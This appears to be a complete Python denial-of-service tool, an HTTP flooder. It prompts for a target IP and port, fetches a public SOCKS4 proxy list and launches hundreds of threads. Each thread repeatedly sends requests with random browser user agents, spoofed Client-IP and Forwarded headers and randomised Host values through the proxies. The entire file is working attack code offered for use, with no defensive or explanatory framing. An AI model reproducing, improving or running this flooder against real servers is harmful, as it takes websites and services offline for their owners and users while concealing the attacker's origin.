#code by HKquiet
#from math import trunc
import os
import time
import requests
import sys
import socks
import random
import threading
import socket

userag = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/81.0.4044.62 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36"
]
acept = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
]
#refer = [
#    'https://www.google.com/',
#    'https://www.youtube.com/',
#    'https://www.dstat.cc/',
#    'https://www.check-host.net//',
#    'https://www.discord.com/',
#    'https://www.rrcs-67-79-47-3.sw.biz.rr.com/',
#    'https://www.facebook.com/',
#    'https://www.instagram.com/',
#    'https://www.bing.com/',
#    'https://www.virtualbox.org/',
#    'https://www.vedbex.com/',
#    'https://www.github.com/',
#    'https://www.whatsapp.com/',
#    'https://www.google.com/maps/search/',
#    'https://www.kail.org/']

def clear():
    if os.name == 'nt':
        return os.system('cls')
    elif os.name == 'posix':
        return os.system('clear')
    else:return print('\n'*200)

def main():
    """main"""
    global target
    global port
    global thr
    global proxies
    global mode
    
    target = input("Target ip:")
    if target == "":
        main()
        return
    mode = input('Mode[post,head,get,connect](default=post):')
    if mode == '' or 'post':mode = 'POST'
    elif mode == 'head':mode = 'HEAD'
    elif mode == 'get':mode = 'GET'
    elif mode == 'connect':mode = 'CONNECT'
    port = input("Port(default=80):")
    if port == '':port = 80
    thr = input("Threads(default=500):")
    if thr == '':thr = 500
    getnewproxies = input("Do you want to get a new socks List?(default=y)(y/n)")
    if getnewproxies == "y" or getnewproxies == '':get_new_proxies()
    proxies = open("proxy.txt").readlines()
    print("there are {} proxies".format(str(len(proxies))))
    startatk()

def get_new_proxies():
    """get new proxies"""
    newproxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&anonymity=all&ssl=all&timeout=5000")
    with open("proxy.txt", "wb") as write:
        write.write(newproxies.content)
        time.sleep(0.1)
        print("success get new proxies")

def startatk():
    """start atk"""
    threads = []
    for i in range(int(thr)):
        try:
            th = threading.Thread(target=atk, args=(str(i + 1),))
            threads.append(th)
            sys.stdout.write("{} threads was created\r".format(str(i + 1)))
        except RuntimeError:
            return
    input("\nPress a key to start flooding...")
    clear()
    for n in threads:
        try:
            n.start()
        except RuntimeError:
            return

def atk(thrNum):
    """attack server"""
    proxy = random.choice(proxies).strip().split(":")
    errorproxy = 0
    while True:
        if errorproxy > 10:
            proxy = random.choice(proxies).strip().split(":")
            sys.stdout.write("[Proxy Timeout] Thread No.{} has changed proxy...                                                    \n\r".format(thrNum))
            errorproxy = 0
        try:
            s1 = socks.socksocket()
            s1.set_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]))
            data = ""
            data += "{} /?={} HTTP/1.1\r\nHost: {}.{}.{}.{}:80\r\n".format(str(mode), str(random.randint(1, 30000)),str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
            data += "User-Agent: {}\r\n".format(random.choice(userag))
            data += random.choice(acept)
            #data += "Referer: http://{}/\r\n".format(str(target))
            #data += "Cookie: sid={}; path=/; status=enable;\r\n".format(str(random.randint(1000000000000, 9000000000000)), )
            #data += "Cache-Control: no-store\r\n"
            #data += "Content-Length: {}\r\n".format(str(len(dat)))
            #data += "X-Forwarded-For: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
            data += "Client-IP: {}.{}.{}.{}\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)),str(random.randint(1, 255)))
            data += "Forwarded: by={}.{}.{}.{}; for={}.{}.{}.{};\r\n".format(str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)), str(random.randint(1, 255)))
            data += "Connection: Keep-Alive\r\n\r\n"
            #data += "{}\r\n\r\n".format(dat)
            s1.connect((str(target), int(port)))
            s1.send(str.encode(data))
            sys.stdout.write("floodling [ {}:{} ] <========== [ {}:{} ]                 \r".format(str(target), str(port), str(proxy[0]), str(proxy[1])))
            try:
                while True:
                    try:
                        s1.send(str.encode(data))
                    except socks.ProxyConnectionError or socks.GeneralProxyError or socks.ProxyError:
                        break
                s1.close()
                sys.stdout.write("floodling [ {}:{} ] <========== [ {}:{} ]             \r".format(str(target), str(port), str(proxy[0]), str(proxy[1])))
            except:
                s1.close()
        except KeyboardInterrupt:
            s1.close()
            exit(1)
        except:
            errorproxy += 1
            s1.close()

if __name__ == "__main__":
    print('''##################################################################################################
#                                                                                                #
#                            //////-`                        -s.                                 #          
#                           `Nm///+hm/                       +M:                 .s.             #
#         `/+++-    ./++/.  `Nh     Nm    -+++/.     -+++:`  +M:  .:-   -+++:`  .oM+:-           #
#        +Ny::/ms `sNo::om/ `Nd..-:sm/  .hm+-:oNo  -dd/::yd. +M:`+ms` .dd/-:hm- -oMo::           #
#       -Ms       +M/    `  `NmsshNy`   yM.    +M/ dN`    `  +Msmh.   hMo+++oNd  :M-             #
#       -Ms       +M/       `Nh   .dm-  hM`    +M+ mm`       +My+N+   hM------.  :M:             #
#        oNs:.:yh``yN+-./do `Nh    `mN- .dd/..+Ny` -md/--om- +M: -mh. -md/..:h+  :M+.-           #
#         .+sso:`   -+sso-  `+/     .+/   :oss+-    `:oss+.  -o.  `++` `:oss+-    /so/           #
#                                                                                                #
##################################################################################################''')
    main()
